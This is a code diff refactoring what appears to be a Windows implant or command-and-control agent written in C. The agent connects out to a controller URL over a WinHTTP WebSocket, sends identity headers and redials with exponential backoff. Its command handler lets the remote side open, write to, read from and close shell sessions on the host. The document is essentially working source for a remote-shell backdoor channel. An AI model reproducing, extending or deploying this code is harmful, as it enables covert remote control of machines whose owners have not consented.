@@ -10,7 +10,33 @@
 #include "wire.h"
 #include "random.h"
 
+
+static BOOL HandleCommand(UINT8 opcode, PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
+{
+    switch ((CommandType)opcode)
+    {
+#if SUPPORT_SHELL
+    case Command_OpenShell:
+        Handle_OpenShellCommand(command, commandLength, response, responseLength, context);
+        return TRUE;
+    case Command_WriteShell:
+        Handle_WriteShellCommand(command, commandLength, response, responseLength, context);
+        return TRUE;
+    case Command_ReadShell:
+        Handle_ReadShellCommand(command, commandLength, response, responseLength, context);
+        return TRUE;
+    case Command_CloseShell:
+        Handle_CloseShellCommand(command, commandLength, response, responseLength, context);
+        return TRUE;
+#endif
+    default:
+        return FALSE;
+    }
+}
+
+
 static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CHAR *sessionKey);
+
 
 INT32 agent_main(const WCHAR *url)
 {
@@ -22,12 +48,8 @@ INT32 agent_main(const WCHAR *url)
 
     shell_slot shells[SHELL_POOL_SIZE];
 
-    int backoff_steps[6];
 
-    volatile int *bs = backoff_steps;
-    bs[0] = 1;  bs[1] = 2;  bs[2] = 4;  bs[3] = 8;  bs[4] = 16; bs[5] = 32;
-    const int backoff_count = 6;
-    int backoff_pos = 0;
+    int backoff_delay = 1;
     Context ctx;
 
     MemoryZero(shells, sizeof(shells));
@@ -47,12 +69,12 @@ INT32 agent_main(const WCHAR *url)
         rc = run_session(&ctx, url, &long_lived, sessionKey);
 
         if (rc == RC_SESSION_LOST) {
-            int wait_s = backoff_steps[backoff_pos];
+            int wait_s = backoff_delay;
 
             if (long_lived)
-                backoff_pos = 0;
-            else if (backoff_pos + 1 < backoff_count)
-                backoff_pos++;
+                backoff_delay = 1;
+            else if (backoff_delay < 32)
+                backoff_delay *= 2;
 
             LOG_INFO("Connection lost - redialing in %d s", wait_s);
             kernel.Sleep((DWORD)wait_s * 1000);
@@ -65,7 +87,7 @@ static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CH
 {
     int rc = RC_SESSION_LOST;
     BOOL https = FALSE;
-    DWORD request_flags = WINHTTP_FLAG_REFRESH;
+    DWORD request_flags;
     USIZE headers_len = 0;
 
     HINTERNET session = NULL, connection = NULL, request = NULL, socket = NULL;
@@ -81,7 +103,9 @@ static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CH
         LOG_ERROR("Failed to resolve the WinHTTP table\n");
         return RC_LOCAL_ERROR;
     }
-    ((Context *)ctx)->winhttp = &winhttp;
+
+    ctx->winhttp = &winhttp;
+
 
     *long_lived = 0;
 
@@ -140,7 +164,7 @@ static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CH
         LOG_ERROR("WinHttpSetOption UPGRADE_TO_WEB_SOCKET failed (GLE=%lu)", (unsigned long)kernel32.GetLastError());
         goto cleanup;
     }
-    
+
     CHAR headers_a[IDENTITY_HEADERS_SIZE];
     headers_len = Handle_IdentityHeadersCommand(headers_a, sessionKey);
     if (headers_len == 0) {
@@ -196,12 +220,7 @@ static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CH
         unsigned int corr_id = (msg.length >= 5) ? ReadU32LE(msg.data, 1) : 0;
 
         if (msg.truncated) {
-            unsigned char status_error[8];
-            MemoryZero(status_error, sizeof(status_error));
-
-            int pos = 4;
-            WriteU32LE(status_error, &pos, corr_id);
-            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, status_error, sizeof(status_error));
+            err = SendErrorResponse(&winhttp, socket, corr_id);
             
             if (err == NO_ERROR) {
                 LOG_ERROR("Message over max size - refused, status 1");
@@ -217,33 +236,25 @@ static int run_session(Context *ctx, const WCHAR *url, int *long_lived, const CH
             goto cleanup;
         }
 
+        BOOL isValid = (opcode == Command_OpenShell && msg.length >= 5) || ((opcode < CommandTypeCount) && msg.length >= 13);
         unsigned char response_buffer[8 + SHELL_READ_CHUNK + 1];
         PCHAR response = (PCHAR)response_buffer;
         USIZE responseLength = 0;
+        BOOL handled = FALSE;
 
-        if (opcode == Command_OpenShell) {
-            Handle_OpenShellCommand((PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
-            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
-        } else if (opcode == Command_WriteShell && msg.length >= 13) {
-            Handle_WriteShellCommand((PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
-            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
-        } else if (opcode == Command_ReadShell && msg.length >= 13) {
-            Handle_ReadShellCommand((PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
-            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
-        } else if (opcode == Command_CloseShell && msg.length >= 13) {
-            Handle_CloseShellCommand((PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
-            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
-        } else {
-            unsigned char status_error[8];
-            MemoryZero(status_error, sizeof(status_error));
+        if (isValid)
+            handled = HandleCommand(opcode, (PCHAR)msg.data, msg.length, &response, &responseLength, ctx);
 
-            int pos = 4;
-            WriteU32LE(status_error, &pos, corr_id);
-            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, status_error, sizeof(status_error));
+        if (handled) {
+            err = winhttp.WinHttpWebSocketSend(socket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (unsigned char *)response, (DWORD)responseLength);
+        } 
+        else {
+            err = SendErrorResponse(&winhttp, socket, corr_id);
             if (err == NO_ERROR) {
                 LOG_INFO("Command 0x%02x not implemented - replied status 1 (corr=%u)", opcode, corr_id);
             }
         }
+
         if (err != NO_ERROR) {
             LOG_ERROR("Failed to send WebSocket response err=%lu", (unsigned long)err);
             goto cleanup;
